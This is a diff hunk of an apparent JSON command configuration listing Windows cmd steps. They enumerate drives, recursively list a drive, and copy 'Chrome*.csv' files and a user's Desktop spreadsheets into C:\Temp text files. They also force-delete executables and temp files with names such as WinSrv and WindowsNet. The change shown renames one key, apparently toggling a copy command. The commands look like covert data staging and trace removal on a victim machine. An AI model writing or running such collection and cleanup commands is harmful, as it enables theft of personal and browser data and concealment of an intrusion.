@@ -26,7 +26,7 @@
   "____cmdCommandsList": ["@echo off","wmic logicaldisk get deviceid, volumename >> \"C:\\Temp\\string2.txt\""],
   "_____cmdCommandsList": ["@echo off","dir E:\\ /s /b >> \"C:\\Temp\\string2.txt\""],
   "______cmdCommandsList": ["@echo off","copy \"D:\\Chrome*.csv\" \"C:\\Temp\\string3.txt\""],
-  "cmdCommandsList": ["@echo off","copy \"C:\\Users\\user\\Desktop\\YILLARA*.xlsx\" \"C:\\Temp\\string3.txt\""],
+  "__________cmdCommandsList": ["@echo off","copy \"C:\\Users\\user\\Desktop\\YILLARA*.xlsx\" \"C:\\Temp\\string3.txt\""],
   "_____del any exe filename starts with___cmdCommandsList": ["@echo off","del /f /q \"C:\\Program Files\\Common Files\\cameraAnalysisEXE*.exe\""],
   "_____del any filename starts with___cmdCommandsList": ["@echo off","del /f /q \"C:\\Temp\\WindowsNet*\""],
   "_____del any filename starts with____cmdCommandsList": ["@echo off","del /f /q \"C:\\Temp\\WinSrv*\""],
